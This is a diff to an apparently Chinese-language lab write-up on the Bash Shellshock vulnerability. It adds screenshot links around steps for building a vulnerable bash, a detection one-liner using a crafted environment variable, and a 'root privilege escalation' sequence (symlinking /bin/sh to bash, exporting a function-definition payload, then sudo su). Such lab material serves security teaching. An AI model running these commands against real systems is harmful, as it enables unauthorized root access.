@@ -22,11 +22,13 @@
 * ./configure
 * make & make install（安装）
 * bash -version
-
+![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/1.png)
+![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/2.png)
+![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/4.png)
 ### 2、检测漏洞是否存在
 * 命令行：
 * env x=’() { :; };echo vulnerable’ bash -c “echo this is a test”
-
+![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/5.png)
 * 可以看到，终端中除了输出this is a test，而且同时输出了 Vulnerable，证明该漏洞存在
 
 ## 四、漏洞利用，root权限提取
@@ -34,5 +36,7 @@
 * 命令行：sudo ln -sf /bin/bash /bin/sh：使/bin/sh指向/bin/bash
 * 命令行：export foo="() { :; }; bash"
 * 命令行：sudo su
-
+![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/6.png)
+![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/7.png)
+![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/8.png)
 * 可以看到，当输入sudo su后，命令行在不需要输入密码时权限变为root，实现了root权限的提权
